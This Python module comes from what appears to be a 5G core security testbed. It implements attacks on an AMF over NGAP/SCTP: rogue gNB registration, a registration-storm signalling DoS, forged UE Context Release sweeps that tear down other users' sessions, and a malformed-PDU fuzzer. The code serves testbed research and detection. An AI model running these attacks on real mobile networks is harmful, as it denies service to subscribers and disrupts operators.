"""N2 (NGAP over SCTP) attacks against the AMF. See docs/threat-model.md section 4.

N2 has no IP spoofing: every PDU rides the attacker's own SCTP association, so the
probe and the labeller attribute these runs by the attacker address alone (no reserved
sequence numbers are needed, unlike the spoofed N4 variants). The "forgery" is at the
NGAP identity layer -- a fake gNB ID, another UE's AMF-UE-NGAP-ID -- not the IP.

SCTP needs the kernel stack, which the Docker testbed has (the CI loads the module) but
a bare sandbox does not; the encoders are validated offline against the probe and
pycrate, and the live association is exercised on the testbed (scripts/attack-check.sh).
"""

from __future__ import annotations

import random
import time
from typing import TYPE_CHECKING, Any, ClassVar

from prahari_attacks import nas, ngap
from prahari_attacks.scenarios.base import (
    AMF_IP,
    NGAP_SCTP_PORT,
    Context,
    Pacer,
    Param,
    Scenario,
)

if TYPE_CHECKING:
    from prahari_attacks.guard import SctpAssociation

IMSI_BASE = 1  # testbed subscribers are imsi-001010000000001 ..


class _N2(Scenario):
    interface: ClassVar[str] = "N2"
    common: ClassVar[tuple[Param, ...]] = (Param("amf", AMF_IP, "target AMF (NGAP/SCTP)"),)

    @classmethod
    def targets(cls, params: dict[str, Any]) -> list[str]:
        return [params["amf"]]

    def _connect(self, ctx: Context) -> SctpAssociation:
        return ctx.guard.sctp_connect(ctx.params["amf"], NGAP_SCTP_PORT, source_ip=ctx.attacker_ip)

    def _ng_setup(
        self, ctx: Context, assoc: SctpAssociation, gnb_id: int, name: str, budget: float = 3.0
    ) -> str:
        """Becomes a gNB on this association. Returns the AMF's verdict.

        Keeps reading (and the association open) until an NGAP reply decodes or the budget
        passes: `recv` returns None both on a timeout slice and on an SCTP notification
        (e.g. COMM_UP on a fresh association), and a single read could consume the
        notification and close before the NG Setup Response ever reaches the wire."""
        assoc.send(ngap.ng_setup_request(gnb_id, name=name))
        ctx.manifest.count("sent:NGSetupRequest")
        deadline = time.monotonic() + budget
        while time.monotonic() < deadline:
            reply = assoc.recv(max(0.1, deadline - time.monotonic()))
            if reply is None:
                continue  # timeout slice or an SCTP notification to skip
            try:
                d = ngap.parse(reply)
            except Exception:  # any decode failure is just an opaque reply
                return "undecoded reply"
            if d.pdu_type == "successfulOutcome":
                ctx.manifest.count("response:NGSetupResponse")
                return "accepted"
            ctx.manifest.count("response:NGSetupFailure")
            return f"rejected ({d.cause})" if d.cause else "rejected"
        return "no response"

    def _drain(self, ctx: Context, assoc: SctpAssociation, budget: float) -> None:
        """Reads and tallies whatever the AMF sends back within `budget` seconds."""
        deadline = time.monotonic() + budget
        while time.monotonic() < deadline:
            reply = assoc.recv(max(0.01, deadline - time.monotonic()))
            if reply is None:
                continue
            try:
                d = ngap.parse(reply)
            except Exception:
                ctx.manifest.count("response:undecoded")
                continue
            ctx.manifest.count(f"response:{d.message}")


class RogueGnb(_N2):
    attack_id = "N2-02"
    title = "Rogue gNB NG Setup"
    mechanism = (
        "NG Setup Request from an unauthenticated node claiming a chosen gNB ID. With no "
        "N2 security (IPsec/NDS), the AMF accepts any peer that completes SCTP, so a rogue "
        "base station can attach and then speak for UEs."
    )
    params = (
        *_N2.common,
        Param("gnb_id", 0xBAD, "gNB ID to claim"),
        Param("name", "PRAHARI-rogue", "RAN node name to present"),
        Param("count", 1, "distinct rogue gNBs to set up (one association each)"),
    )

    def run(self, ctx: Context) -> None:
        p = ctx.params
        verdicts = []
        for i in range(p["count"]):
            if ctx.expired():
                break
            assoc = self._connect(ctx)
            verdicts.append(self._ng_setup(ctx, assoc, p["gnb_id"] + i, f"{p['name']}-{i}"))
            assoc.close()
        ctx.manifest.outcome["setups"] = verdicts
        ctx.manifest.outcome["accepted"] = sum(v == "accepted" for v in verdicts)


class RegistrationStorm(_N2):
    attack_id = "N2-01"
    title = "NGAP registration storm"
    mechanism = (
        "After one NG Setup, floods Initial UE Messages with incrementing RAN-UE-NGAP-IDs, "
        "each carrying a NAS Registration Request. Every id makes the AMF allocate a RAN UE "
        "context and begin authentication (fetching vectors from AUSF/UDM): a signalling DoS."
    )
    params = (
        *_N2.common,
        Param("gnb_id", 0xBAD, "gNB ID of the attacking base station"),
        Param("count", 200, "Initial UE Messages to send"),
        Param("ran_ue_start", 1, "first RAN-UE-NGAP-ID"),
        Param("rate", 100.0, "messages per second (0 = unpaced)"),
        Param("vary_suci", True, "present a distinct subscriber (SUCI) per message"),
    )

    def run(self, ctx: Context) -> None:
        p = ctx.params
        assoc = self._connect(ctx)
        ctx.manifest.outcome["association"] = self._ng_setup(ctx, assoc, p["gnb_id"], "PRAHARI-gnb")
        pace = Pacer(p["rate"])
        for i in range(p["count"]):
            if ctx.expired():
                break
            pace.wait()
            body = None
            if p["vary_suci"]:
                body = nas.registration_request(f"00101{IMSI_BASE + i:010d}")
            assoc.send(ngap.initial_ue_message(p["ran_ue_start"] + i, nas=body))
            ctx.manifest.count("sent:InitialUEMessage")
            self._drain(ctx, assoc, 0.0)  # opportunistic, non-blocking
        self._drain(ctx, assoc, 3.0)
        assoc.close()
        ctx.manifest.outcome["sent"] = p["count"]


class ForgedUeRelease(_N2):
    attack_id = "N2-03"
    title = "Forged UE Context Release"
    mechanism = (
        "From a rogue gNB association, forges UE Context Release Requests across a range of "
        "AMF-UE-NGAP-IDs to tear down other UEs' sessions. A correct AMF rejects a release "
        "for a context that is not on this association; the run records which it does."
    )
    params = (
        *_N2.common,
        Param("gnb_id", 0xBAD, "gNB ID of the attacking base station"),
        Param("amf_ue_start", 1, "first AMF-UE-NGAP-ID to target"),
        Param("amf_ue_count", 64, "AMF-UE-NGAP-IDs to sweep"),
        Param("ran_ue", 1, "RAN-UE-NGAP-ID to present"),
        Param("cause", "user-inactivity", "release cause (radioNetwork)"),
        Param("rate", 50.0, "messages per second (0 = unpaced)"),
    )

    def run(self, ctx: Context) -> None:
        p = ctx.params
        assoc = self._connect(ctx)
        ctx.manifest.outcome["association"] = self._ng_setup(ctx, assoc, p["gnb_id"], "PRAHARI-gnb")
        pace = Pacer(p["rate"])
        for i in range(p["amf_ue_count"]):
            if ctx.expired():
                break
            pace.wait()
            amf_ue = p["amf_ue_start"] + i
            assoc.send(ngap.ue_context_release_request(amf_ue, p["ran_ue"], p["cause"]))
            ctx.manifest.count("sent:UEContextReleaseRequest")
            self._drain(ctx, assoc, 0.0)
        self._drain(ctx, assoc, 3.0)
        assoc.close()
        ctx.manifest.outcome["swept"] = p["amf_ue_count"]


def fuzz_mutate(rng: random.Random, templates: list[bytes]) -> bytes:
    """A malformed NGAP PDU: a mutated real message or pure garbage, seeded for replay."""
    kind = rng.random()
    if kind < 0.25:
        return bytes(rng.randrange(256) for _ in range(rng.randint(1, 64)))
    base = bytearray(rng.choice(templates))
    if kind < 0.55:  # flip a handful of bytes
        for _ in range(rng.randint(1, 6)):
            base[rng.randrange(len(base))] = rng.randrange(256)
    elif kind < 0.8:  # truncate
        base = base[: rng.randint(1, len(base))]
    else:  # append junk (fools length determinants)
        base += bytes(rng.randrange(256) for _ in range(rng.randint(1, 32)))
    return bytes(base)


class NgapFuzz(_N2):
    attack_id = "N2-04"
    title = "Malformed NGAP fuzz"
    mechanism = (
        "Sends malformed NGAP PDUs over SCTP -- mutated real messages and random bytes from a "
        "seeded RNG -- to test AMF robustness. A robust AMF answers with Error Indication or "
        "ignores them; a crash or dropped association is a finding."
    )
    params = (
        *_N2.common,
        Param("count", 300, "malformed PDUs to send"),
        Param("seed", 1337, "RNG seed (runs are reproducible)"),
        Param("setup_first", True, "complete NG Setup before fuzzing"),
        Param("gnb_id", 0xBAD, "gNB ID for the optional NG Setup"),
        Param("rate", 200.0, "messages per second (0 = unpaced)"),
    )

    def run(self, ctx: Context) -> None:
        p = ctx.params
        assoc = self._connect(ctx)
        if p["setup_first"]:
            ctx.manifest.outcome["association"] = self._ng_setup(
                ctx, assoc, p["gnb_id"], "PRAHARI-gnb"
            )
        rng = random.Random(p["seed"])  # noqa: S311 - reproducible fuzzing, not crypto
        tmpls = list(ngap.templates().values())
        pace = Pacer(p["rate"])
        disconnects = 0
        for _ in range(p["count"]):
            if ctx.expired():
                break
            pace.wait()
            try:
                assoc.send(fuzz_mutate(rng, tmpls))
                ctx.manifest.count("sent:fuzz")
            except OSError:
                disconnects += 1
                assoc = self._connect(ctx)  # AMF aborted the association; reconnect
            try:
                if assoc.recv(0.0) is not None:
                    ctx.manifest.count("response:any")
            except RuntimeError:
                disconnects += 1
                assoc = self._connect(ctx)
        assoc.close()
        ctx.manifest.outcome["sent"] = p["count"]
        ctx.manifest.outcome["disconnects"] = disconnects
